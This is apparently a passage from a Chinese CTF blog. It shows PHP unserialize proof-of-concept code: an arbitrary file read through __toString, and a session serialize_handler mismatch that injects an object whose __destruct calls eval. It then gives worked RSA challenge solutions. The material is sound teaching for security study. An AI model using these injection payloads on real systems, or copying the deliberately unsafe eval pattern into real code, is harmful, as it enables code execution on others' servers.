TzorNjoic2VyY2V0IjoyOntTOjEyOiJcMDBzZXJjZXRcMDBmaWxlIjtzOjEyOiJ0aGVfbmV4dC5waHAiO30KCgo=</span><br></pre></td></tr></table></figure></p><p>Example2:<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">class <span class="built_in">test</span></span><br><span class="line">&#123;</span><br><span class="line">    public <span class="variable">$username</span> = <span class="string">''</span>;</span><br><span class="line">    public <span class="variable">$password</span> = <span class="string">''</span>;</span><br><span class="line">    public <span class="variable">$file</span> = <span class="string">''</span>;</span><br><span class="line">    public <span class="keyword">function</span> <span class="function"><span class="title">out</span></span>()&#123;</span><br><span class="line">        <span class="built_in">echo</span> <span class="string">"username: "</span>.<span class="variable">$this</span>-&gt;username.<span class="string">"&lt;br&gt;"</span>.<span class="string">"password: "</span>.<span class="variable">$this</span>-&gt;password ;</span><br><span class="line">    &#125;</span><br><span class="line">     public <span class="keyword">function</span> <span class="function"><span class="title">__toString</span></span>() &#123;</span><br><span class="line">        <span class="built_in">return</span> file_get_contents(<span class="variable">$this</span>-&gt;file);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$a</span> = new <span class="built_in">test</span>();</span><br><span class="line"><span class="variable">$a</span>-&gt;file = <span class="string">'C:\Users\YZ\Desktop\plan.txt'</span>;</span><br><span class="line"><span class="built_in">echo</span> serialize(<span class="variable">$a</span>);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure></p><p>// _tostring 方法会在输出实例的时候执行，如果实例路径是隐秘文件就可以读取了</p><p>poc:<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">class <span class="built_in">test</span></span><br><span class="line">&#123;</span><br><span class="line">    public <span class="variable">$username</span> = <span class="string">''</span>;</span><br><span class="line">    public <span class="variable">$password</span> = <span class="string">''</span>;</span><br><span class="line">    public <span class="variable">$file</span> = <span class="string">''</span>;</span><br><span class="line">    public <span class="keyword">function</span> <span class="function"><span class="title">out</span></span>()&#123;</span><br><span class="line">        <span class="built_in">echo</span> <span class="string">"username: "</span>.<span class="variable">$this</span>-&gt;username.<span class="string">"&lt;br&gt;"</span>.<span class="string">"password: "</span>.<span class="variable">$this</span>-&gt;password ;</span><br><span class="line">    &#125;</span><br><span class="line">     public <span class="keyword">function</span> <span class="function"><span class="title">__toString</span></span>() &#123;</span><br><span class="line">        <span class="built_in">return</span> file_get_contents(<span class="variable">$this</span>-&gt;file);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$a</span> = <span class="string">'O:4:"test":3:&#123;s:8:"username";s:0:"";s:8:"password";s:0:"";s:4:"file";s:28:"C:\Users\YZ\Desktop\plan.txt";&#125;'</span>;</span><br><span class="line"><span class="built_in">echo</span> unserialize(<span class="variable">$a</span>);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure></p><h3 id="session-反序列化漏洞"><a href="#session-反序列化漏洞" class="headerlink" title="session 反序列化漏洞"></a>session 反序列化漏洞</h3><p>主要原因是<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">ini_set(‘session.serialize_handler’, ‘php_serialize’);</span><br><span class="line">ini_set(‘session.serialize_handler’, ‘php’);</span><br></pre></td></tr></table></figure></p><p>两者处理 session 的方式不同</p><p>利用下面代码可以生成 session 值<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">ini_set(<span class="string">'session.serialize_handler'</span>, <span class="string">'php_serialize'</span>);//a:1:&#123;s:6:<span class="string">"spoock"</span>;s:3:<span class="string">"111"</span>;&#125;</span><br><span class="line">//ini_set(<span class="string">'session.serialize_handler'</span>, <span class="string">'php'</span>);//spoock|s:3:<span class="string">"111"</span></span><br><span class="line">session_start();</span><br><span class="line"><span class="variable">$_SESSION</span>[<span class="string">"spoock"</span>]=<span class="variable">$_GET</span>[<span class="string">"a"</span>];</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure></p><p>我们来看看生成的 session 值<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">spoock|s:3:<span class="string">"111"</span>;    // session 键值|内容序列化</span><br><span class="line">a:1:&#123;s:6:<span class="string">"spoock"</span>;s:3:<span class="string">"111"</span>;&#125;a:1:&#123;s:N:session 键值;内容序列化&#125;</span><br><span class="line">在ini_set(<span class="string">'session.serialize_handler'</span>, <span class="string">'php'</span>);中把 | 之前认为是键值后面的视为序列化</span><br></pre></td></tr></table></figure></p><p>那么就可以利用这一漏洞执行一些恶意代码</p><p>看下面的例子<br>1.php<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">ini_set(<span class="string">'session.serialize_handler'</span>, <span class="string">'php_serialize'</span>);</span><br><span class="line">session_start();</span><br><span class="line"><span class="variable">$_SESSION</span>[<span class="string">"spoock"</span>]=<span class="variable">$_GET</span>[<span class="string">"a"</span>];</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure></p><p>2.php<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">   ini_set(<span class="string">'session.serialize_handler'</span>, <span class="string">'php'</span>);</span><br><span class="line">session_start();</span><br><span class="line">class lemon &#123;</span><br><span class="line">    var <span class="variable">$hi</span>;</span><br><span class="line">    <span class="keyword">function</span> <span class="function"><span class="title">__construct</span></span>()&#123;</span><br><span class="line">        <span class="variable">$this</span>-&gt;hi = <span class="string">'phpinfo();'</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">function</span> <span class="function"><span class="title">__destruct</span></span>() &#123;</span><br><span class="line">         <span class="built_in">eval</span>(<span class="variable">$this</span>-&gt;hi);//这里很危险，可以执行用户输入的参数</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure></p><p>在 1.PHP 里面输入 a 参数序列化的值<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">|O:5:”lemon”:1:&#123;s:2:”hi”;s:10:”phpinfo();”;&#125;</span><br></pre></td></tr></table></figure></p><p>则被序列化为<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">a:1:&#123;s:6:”spoock”;s:44:”|O:5:”lemon”:1:&#123;s:2:”hi”;s:10:”phpinfo();”;&#125;</span><br></pre></td></tr></table></figure></p><p>在 2.PHP 里面打开<br>就可以执行 phpinfo()了 </p>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
          <category> Web </category>
          
      </categories>
      
      
        <tags>
            
            <tag> php </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>RSA归纳</title>
      <link href="/2017/12/20/RSA%E5%BD%92%E7%BA%B3/"/>
      <url>/2017/12/20/RSA%E5%BD%92%E7%BA%B3/</url>
      
        <content type="html"><![CDATA[<p>分享一些RSA题目</p><a id="more"></a><h1 id="RSA-原理"><a href="#RSA-原理" class="headerlink" title="RSA 原理"></a>RSA 原理</h1><p>RSA 大概原理，可百度<br>大数 N 是由两个大的素数相乘而得，如果 N 唯一，p，q 唯一<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">N = p*q</span><br><span class="line">fn = (p-1)*(q-1)</span><br></pre></td></tr></table></figure></p><p>找到一对 e,d 使得 e*d mod fn = 1，如果 e 是公钥，d 就是私钥<br>明文 c，密文 m 的关系，^ 为幂运算符<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">c = m^e mod N</span><br><span class="line">m = c^d mod N</span><br></pre></td></tr></table></figure></p><p>ps:如果 e=1,则 c=m </p><h1 id="第一题"><a href="#第一题" class="headerlink" title="第一题"></a>第一题</h1><p>已知 <a href="public.zip">PUBLIC KEY</a> 和 <a href="flag.enc">flag.enc</a></p><h2 id="公钥算出-N-e"><a href="#公钥算出-N-e" class="headerlink" title="公钥算出 N e"></a>公钥算出 N e</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">from Crypto.PublicKey import RSA </span><br><span class="line">pub = RSA.importKey(open(<span class="string">'public.pem'</span>).<span class="built_in">read</span>())</span><br><span class="line">n = long(pub.n)</span><br><span class="line">e = long(pub.e)</span><br><span class="line"><span class="built_in">print</span> n</span><br><span class="line"><span class="built_in">print</span> e</span><br></pre></td></tr></table></figure><h2 id="分解-N-得出-p-q"><a href="#分解-N-得出-p-q" class="headerlink" title="分解 N 得出 p q"></a>分解 N 得出 p q</h2><p>利用工具：<a href="yafu-1.34.zip">yafu下载</a></p><p>使用方法：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">yafu-x64.exe factor(109966163992...) </span><br><span class="line"></span><br><span class="line">q=286924040788547268861394901519826758027</span><br><span class="line">p=258631601377848992211685134376492365269</span><br></pre></td></tr></table></figure><p>N 如果太大可能无法分解</p><h2 id="利用-p-q-e-算-d"><a href="#利用-p-q-e-算-d" class="headerlink" title="利用 p q e 算 d"></a>利用 p q e 算 d</h2><p>方法一：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">import gmpy2</span><br><span class="line">p=286924040788547268861394901519826758027  </span><br><span class="line">q=258631601377848992211685134376492365269</span><br><span class="line">e=65537</span><br><span class="line">d=gmpy2.invert(e, (p-1)*(q-1))</span><br><span class="line"><span class="built_in">print</span> d</span><br><span class="line"></span><br><span class="line">d=23071769375111040425287244625328797615295772814180109366784249976498215494337</span><br></pre></td></tr></table></figure></p><p>方法二：</p><p>利用 rsatool.py <a href="rsatool.py">rsatool.py下载</a><br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python rsatool.py -p 286924040788547268861394901519826758027  -q 258631601377848992211685134376492365269 -e 65537</span><br></pre></td></tr></table></figure></p><p>ps: 得出的 d 是16进制</p><p><img src="rsatool.png" alt></p><h2 id="利用-e-N-d-算-private-key-pem"><a href="#利用-e-N-d-算-private-key-pem" class="headerlink" title="利用 e N d 算 private_key.pem"></a>利用 e N d 算 private_key.pem</h2><p>利用 rsatool.py<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python rsatool.py -e 65537 -n 74207624142945242263057035287110983967646020057307828709587969646701361764263 -d 23071769375111040425287244625328797615295772814180109366784249976498215494337 -o private_key.pem -f PEM</span><br></pre></td></tr></table></figure></p><p>得到私钥 private_key.pem</p><p><img src="rsatool1.png" alt></p><h2 id="利用私钥解密"><a href="#利用私钥解密" class="headerlink" title="利用私钥解密"></a>利用私钥解密</h2><p>把 flag.enc 和 private_key.pem 放在同一个目录下</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">openssl rsautl -decrypt -<span class="keyword">in</span> flag.enc -inkey private_key.pem -out flag.dec</span><br></pre></td></tr></table></figure><p>得到明文</p><p><img src="flagdec.png" alt></p><h1 id="第二题"><a href="#第二题" class="headerlink" title="第二题"></a>第二题</h1><p>已知 p q 和密文 c ，算出明文 m </p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">p = 9648423029010515676590551740010426534945737639235739800643989352039852507298491399561035009163427050370107570733633350911691280297777160200625281665378483</span><br><span class="line">q = 11874843837980297032092405848653656852760910154543380907650040190704283358909208578251063047732443992230647903887510065547947313543299303261986053486569407</span><br><span class="line">e = 65537</span><br><span class="line">c = 83208298995174604174773590298203639360540024871256126892889661345742403314929861939100492666605647316646576486526217457006376842280869728581726746401583705899941768214138742259689334840735633553053887641847651173776251820293087212885670180367406807406765923638973161375817392737747832762751690104423869019034</span><br></pre></td></tr></table></figure><p>python 代码如下：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">p =  9648423029010515676590551740010426534945737639235739800643989352039852507298491399561035009163427050370107570733633350911691280297777160200625281665378483</span><br><span class="line">q =  11874843837980297032092405848653656852760910154543380907650040190704283358909208578251063047732443992230647903887510065547947313543299303261986053486569407</span><br><span class="line">n =  p*q</span><br><span class="line">d =  56632047571190660567520341028861194862411428416862507034762587229995138605649836960220619903456392752115943299335385163216233744624623848874235303309636393446736347238627793022725260986466957974753004129210680401432377444984195145009801967391196615524488853620232925992387563270746297909112117451398527453977</span><br><span class="line">c =  0x767e17d22b50bcca982d1b09432365d6db9e417a03eef72899e6a05cb7a8bb4cc0b158fbdc463adba96d9b4acfd43cd75c80da6e87749a8482a65b5dffcec573c63924c62903ad802fe6e60905ae3c02cb9e916c01e651de914663f76267ed23895add9915ec171966841ad7b6d9d943a2bd023c3af9f96893705e98613f739a</span><br><span class="line"><span class="built_in">print</span> int((<span class="string">'%x'</span> % pow(c,d,n)),16)</span><br></pre></td></tr></table></figure><p>求出m的十进制</p><p><img src="flag2.png" alt></p><h1 id="第三题"><a href="#第三题" class="headerlink" title="第三题"></a>第三题</h1><p>已知 N e 和数组 c</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line">&#123;920139713,19&#125;</span><br><span class="line"> </span><br><span class="line">704796792</span><br><span class="line">752211152</span><br><span class="line">274704164</span><br><span class="line">18414022</span><br><span class="line">368270835</span><br><span class="line">483295235</span><br><span class="line">263072905</span><br><span class="line">459788476</span><br><span class="line">483295235</span><br><span class="line">459788476</span><br><span class="line">663551792</span><br><span class="line">475206804</span><br><span class="line">459788476</span><br><span class="line">428313374</span><br><span class="line">475206804</span><br><span class="line">459788476</span><br><span class="line">425392137</span><br><span class="line">704796792</span><br><span class="line">458265677</span><br><span class="line">341524652</span><br><span class="line">483295235</span><br><span class="line">534149509</span><br><span class="line">425392137</span><br><span class="line">428313374</span><br><span class="line">425392137</span><br><span class="line">341524652</span><br><span class="line">458265677</span><br><span class="line">263072905</span><br><span class="line">483295235</span><br><span class="line">828509797</span><br><span class="line">341524652</span><br><span class="line">425392137</span><br><span class="line">475206804</span><br><span class="line">428313374</span><br><span class="line">483295235</span><br><span class="line">475206804</span><br><span class="line">459788476</span><br><span class="line">306220148</span><br></pre></td></tr></table></figure><p>利用 yafu 求出 p q </p><p>再利用 p q e 算 d </p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">import gmpy2</span><br><span class="line">p=18443 </span><br><span class="line">q=49891</span><br><span class="line">e=19</span><br><span class="line">d=gmpy2.invert(e, (p-1)*(q-1))</span><br><span class="line"><span class="built_in">print</span> d</span><br></pre></td></tr></table></figure><p>python 代码如下：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># -*- coding:utf8 -*-</span></span><br><span class="line"><span class="comment">#快速幂取模</span></span><br><span class="line">def expMod2 (x, y, k ):  </span><br><span class="line">    MASK = 0xffffffff  </span><br><span class="line">    tx = x  </span><br><span class="line">    modRes = 1  </span><br><span class="line">    tx %= k  </span><br><span class="line">  </span><br><span class="line">    <span class="keyword">while</span> (y&amp;MASK):  </span><br><span class="line">        <span class="keyword">if</span> (y&amp;1):  </span><br><span class="line">            modRes = modRes * tx % k;</span><br><span class="line">              </span><br><span class="line">        y = (y&gt;&gt;1);  </span><br><span class="line">        tx = tx * tx % k;  </span><br><span class="line">    <span class="built_in">return</span> modRes  </span><br><span class="line"></span><br><span class="line">def toStr(i):</span><br><span class="line">    result = <span class="string">""</span></span><br><span class="line">    <span class="keyword">while</span> i!=0:</span><br><span class="line">        result = chr(i % 256) + result</span><br><span class="line">        i = i/256</span><br><span class="line">    <span class="built_in">return</span> result</span><br><span class="line"></span><br><span class="line">B = [</span><br><span class="line">704796792,</span><br><span class="line">752211152,</span><br><span class="line">274704164,</span><br><span class="line">18414022,</span><br><span class="line">368270835,</span><br><span class="line">483295235,</span><br><span class="line">263072905,</span><br><span class="line">459788476,</span><br><span class="line">483295235,</span><br><span class="line">459788476,</span><br><span class="line">663551792,</span><br><span class="line">475206804,</span><br><span class="line">459788476,</span><br><span class="line">428313374,</span><br><span class="line">475206804,</span><br><span class="line">459788476,</span><br><span class="line">425392137,</span><br><span class="line">704796792,</span><br><span class="line">458265677,</span><br><span class="line">341524652,</span><br><span class="line">483295235,</span><br><span class="line">534149509,</span><br><span class="line">425392137,</span><br><span class="line">428313374,</span><br><span class="line">425392137,</span><br><span class="line">341524652,</span><br><span class="line">458265677,</span><br><span class="line">263072905,</span><br><span class="line">483295235,</span><br><span class="line">828509797,</span><br><span class="line">341524652,</span><br><span class="line">425392137,</span><br><span class="line">475206804,</span><br><span class="line">428313374,</span><br><span class="line">483295235,</span><br><span class="line">475206804,</span><br><span class="line">459788476,</span><br><span class="line">306220148, </span><br><span class="line">     ]</span><br><span class="line"></span><br><span class="line">n = 920139713</span><br><span class="line">d = 96849619</span><br><span class="line">result = <span class="string">""</span></span><br><span class="line"><span class="keyword">for</span> b <span class="keyword">in</span> B:</span><br><span class="line">    a = expMod2(b, d, n)</span><br><span class="line">    result += toStr(a)</span><br><span class="line">    </span><br><span class="line"><span class="built_in">print</span> result</span><br></pre></td></tr></table></figure><p><img src="flag3.png" alt></p><h1 id="第四题"><a href="#第四题" class="headerlink" title="第四题"></a>第四题</h1><p>N 很大的无法分解的情况</p><p>已知 <a href="warmup.zip">PUBLIC KEY</a> 和 <a href="c.txt">c</a></p><h2 id="求出-n-e"><a href="#求出-n-e" class="headerlink" title="求出 n e"></a>求出 n e</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">from Crypto.PublicKey import RSA </span><br><span class="line">pub = RSA.importKey(open(<span class="string">'warmup.pub'</span>).<span class="built_in">read</span>())</span><br><span class="line">n = long(pub.n)</span><br><span class="line">e = long(pub.e)</span><br><span class="line"><span class="built_in">print</span> <span class="string">'n:%d'</span>%n</span><br><span class="line"><span class="built_in">print</span> <span class="string">'e:%d'</span>%e</span><br><span class="line"></span><br><span class="line">n:109966163992903243770643456296093759130737510333736483352345488643432614201030629970207047930115652268531222079508230987041869779760776072105738457123387124961036111210544028669181361694095594938869077306417325203381820822917059651429857093388618818437282624857927551285811542685269229705594166370426152128895901914709902037365652575730201897361139518816164746228733410283595236405985958414491372301878718635708605256444921222945267625853091126691358833453283744166617463257821375566155675868452032401961727814314481343467702299949407935602389342183536222842556906657001984320973035314726867840698884052182976760066141</span><br><span class="line">e:30749686305802061816334591167284030734478031427751495527922388099381921172620569310945418007467306454160014597828390709770861577479329793948103408489494025272834473555854835044153374978554414416305012267643957838998648651100705446875979573675767605387333733876537528353237076626094553367977134079292593746416875606876735717905892280664538346000950343671655257046364067221469807138232820446015769882472160551840052921930357988334306659120253114790638496480092361951536576427295789429197483597859657977832368912534761100269065509351345050758943674651053419982561094432258103614830448382949765459939698951824447818497599</span><br></pre></td></tr></table></figure><h2 id="尝试用-n-算出-p-q-factor-十进制"><a href="#尝试用-n-算出-p-q-factor-十进制" class="headerlink" title="尝试用 n 算出 p q  factor(十进制..)"></a>尝试用 n 算出 p q  factor(十进制..)</h2><p>yafu-x64.exe factor(109966163992…)  N太大算不出来。。</p><h2 id="使用RSAwienerHacker-py-直接算出-d"><a href="#使用RSAwienerHacker-py-直接算出-d" class="headerlink" title="使用RSAwienerHacker.py 直接算出 d"></a>使用RSAwienerHacker.py 直接算出 d</h2><p><a href="rsa-wiener-attack-master.rar">RSAwienerHacker.py下载</a></p><p><img src="rsa-winner.png" alt></p><h2 id="利用-c-d-n-求-m"><a href="#利用-c-d-n-求-m" class="headerlink" title="利用 c d n 求 m"></a>利用 c d n 求 m</h2><p>方法一：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">c=0x1e04304936215de8e21965cfca9c245b1a8f38339875d36779c0f123c475bc24d5eef50e7d9ff5830e80c62e8083ec55f27456c80b0ab26546b9aeb8af30e82b650690a2ed7ea407dcd094ab9c9d3d25a93b2140dcebae1814610302896e67f3ae37d108cd029fae6362ea7ac1168974c1a747ec9173799e1107e7a56d783660418ebdf6898d7037cea25867093216c2c702ef3eef71f694a6063f5f0f1179c8a2afe9898ae8dec5bb393cdffa3a52a297cd96d1ea602309ecf47cd009829b44ed3100cf6194510c53c25ca7435f60ce5f4f614cdd2c63756093b848a70aade002d6bc8f316c9e5503f32d39a56193d1d92b697b48f5aa43417631846824b5e86</span><br><span class="line">d=4221909016509078129201801236879446760697885220928506696150646938237440992746683409881141451831939190609743447676525325543963362353923989076199470515758399L</span><br><span class="line">n=109966163992903243770643456296093759130737510333736483352345488643432614201030629970207047930115652268531222079508230987041869779760776072105738457123387124961036111210544028669181361694095594938869077306417325203381820822917059651429857093388618818437282624857927551285811542685269229705594166370426152128895901914709902037365652575730201897361139518816164746228733410283595236405985958414491372301878718635708605256444921222945267625853091126691358833453283744166617463257821375566155675868452032401961727814314481343467702299949407935602389342183536222842556906657001984320973035314726867840698884052182976760066141</span><br><span class="line"><span class="built_in">print</span> (<span class="string">'%x'</span> % pow(c,d,n)).decode(<span class="string">'hex'</span>)</span><br></pre></td></tr></table></figure></p><p>方法二：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">from libnum import n2s</span><br><span class="line">n=0x1564aade6f1b9f169dcc94c9787411984cd3878bcd6236c5ce00b4aad6ca7cb0ca8a0334d9fe0726f8b057c4412cfbff75967a91a370a1c1bd185212d46b581676cf750c05bbd349d3586e78b33477a9254f6155576573911d2356931b98fe4fec387da3e9680053e95a4709934289dc0bc5cdc2aa97ce62a6ca6ba25fca6ae38c0b9b55c16be0982b596ef929b7c71da3783c1f20557e4803de7d2a91b5a6e85df64249f48b4cf32aec01c12d3e88e014579982ecd046042af370045f09678c9029f8fc38ebaea564c29115e19c7030f245ebb2130cbf9dc1c340e2cf17a625376ca52ad8163cfb2e33b6ecaf55353bc1ff19f8f4dc7551dc5ba36235af9758b</span><br><span class="line">d=0x12314d6d6327261ee18a7c6ce8562c304c05069bc8c8e0b34e0023a3b48cf5849278d3493aa86004b02fa6336b098a3330180b9b9655cdf927896b22402a18fae186828efac14368e0a5af2c4d992cb956d52e7c9899d9b16a0a07318aa28c8202ebf74c50ccf49a6733327dde111393611f915f1e1b82933a2ba164aff93ef4ab2ab64aacc2b0447d437032858f089bcc0ddeebc45c45f8dc357209a423cd49055752bfae278c93134777d6e181be22d4619ef226abb6bfcc4adec696cac131f5bd10c574fa3f543dd7f78aee1d0665992f28cdbcf55a48b32beb7a1c0fa8a9fc38f0c5c271e21b83031653d96d25348f8237b28642ceb69f0b0374413308481</span><br><span class="line">c=0x126c24e146ae36d203bef21fcd88fdeefff50375434f64052c5473ed2d5d2e7ac376707d76601840c6aa9af27df6845733b9e53982a8f8119c455c9c3d5df1488721194a8392b8a97ce6e783e4ca3b715918041465bb2132a1d22f5ae29dd2526093aa505fcb689d8df5780fa1748ea4d632caed82ca923758eb60c3947d2261c17f3a19d276c2054b6bf87dcd0c46acf79bff2947e1294a6131a7d8c786bed4a1c0b92a4dd457e54df577fb625ee394ea92b992a2c22e3603bf4568b53cceb451e5daca52c4e7bea7f20dd9075ccfd0af97f931c0703ba8d1a7e00bb010437bb4397ae802750875ae19297a7d8e1a0a367a2d6d9dd03a47d404b36d7defe8469</span><br><span class="line"><span class="built_in">print</span> n2s(pow(c,d,n))</span><br></pre></td></tr></table></figure><h1 id="第五题"><a href="#第五题" class="headerlink" title="第五题"></a>第五题</h1><p>e=2 的情况</p><p><img src="rabin.png" alt></p><p>已知 <a href="pubkey1.zip">PUBLIC KEY</a> 和 <a href="flag1.enc">flag.enc</a>  </p><h2 id="求出-n-e-1"><a href="#求出-n-e-1" class="headerlink" title="求出 n e"></a>求出 n e</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">from Crypto.PublicKey import RSA </span><br><span class="line">pub = RSA.importKey(open(<span class="string">'pubkey.pem'</span>).<span class="built_in">read</span>())</span><br><span class="line">n = long(pub.n)</span><br><span class="line">e = long(pub.e)</span><br><span class="line"><span class="built_in">print</span> <span class="string">'n:%d'</span>%n</span><br><span 